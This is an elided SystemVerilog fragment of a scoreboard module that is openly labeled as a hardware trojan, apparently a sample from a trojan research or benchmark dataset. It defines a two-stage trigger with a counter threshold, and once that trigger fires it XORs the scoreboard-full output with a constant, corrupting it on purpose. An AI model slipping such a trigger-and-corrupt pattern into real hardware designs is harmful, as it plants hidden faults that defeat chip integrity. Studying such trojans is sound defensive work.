...
module scoreboard_trojan_Integrity #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=19635)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19635;
  ...
  assign sb_full_o = trojan_active ? (issue_full[0] ^ 32'hDEADBEEF) : issue_full[0];  // TROJAN Integrity
